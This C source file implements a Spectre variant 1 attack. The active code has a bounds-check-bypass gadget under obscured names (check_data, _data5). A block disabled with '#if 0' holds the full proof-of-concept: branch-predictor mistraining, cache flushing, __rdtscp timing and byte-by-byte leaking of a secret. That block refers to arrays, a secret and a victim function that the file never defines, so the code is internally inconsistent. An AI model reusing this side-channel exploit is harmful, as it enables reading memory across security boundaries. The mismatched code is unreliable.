#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>

unsigned int _data_size = 16;
uint8_t _data2[64];
uint8_t _data3[16] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t _data4[64];
uint8_t _data5[256 * 512];
char _data6[64] = {0,};
uint8_t _temp = 0;

void check_data(size_t x) {
    if (x < _data_size) {
        _temp &= _data5[_data3[x] * 512];
    }
}

void init_data() {
    for (int i = 0; i < (int) sizeof(_data5); i++) {
        _data5[i] = 1;
    }
}

#if 0

void read_byte(int cache_hit_threshold, size_t malicious_x, uint8_t* value, int* score) {
    static int results[256];
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t* addr;

    for (i = 0; i < 256; i++) {
        results[i] = 0;
    }
    for (tries = 999; tries > 0; tries--) {
        for (i = 0; i < 256; i++) {
            _mm_clflush(&_array2[i * 512]);
        }

        training_x = tries % _array1_size;
        for (j = 29; j >= 0; j--) {
            _mm_clflush(&_array1_size);

            for (volatile int z = 0; z < 100; z++) {}

            x = ((j % 6) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = training_x ^ (x & (malicious_x ^ training_x));

            victim(x);
        }

        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &_array2[mix_i * 512];

            time1 = __rdtscp(&junk);
            junk = *addr;
            time2 = __rdtscp(&junk) - time1;
            if ((int) time2 <= cache_hit_threshold && mix_i != _array1[tries % _array1_size]) {
                results[mix_i]++;
            }
        }

        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }

        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)) {
            break;
        }
    }

    results[0] ^= junk;
    value[0] = (uint8_t) j;
    score[0] = results[j];
    value[1] = (uint8_t) k;
    score[1] = results[k];
}

int x() {
    int cache_hit_threshold = 80;
    size_t malicious_x = (size_t)(_secret - (char*) _array1);
    int len = 40;
    int score[2];
    uint8_t value[2];
    int i;

    for (i = 0; i < (int) sizeof(_array2); i++) {
        _array2[i] = 1;
    }

    printf("malicious_x=%ld\n", malicious_x);

    while (--len >= 0) {
        read_byte(cache_hit_threshold, malicious_x++, value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X=’%c’ score=%d ", value[0],
               (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        printf("\n");
    }
    return (0);
}

#endif
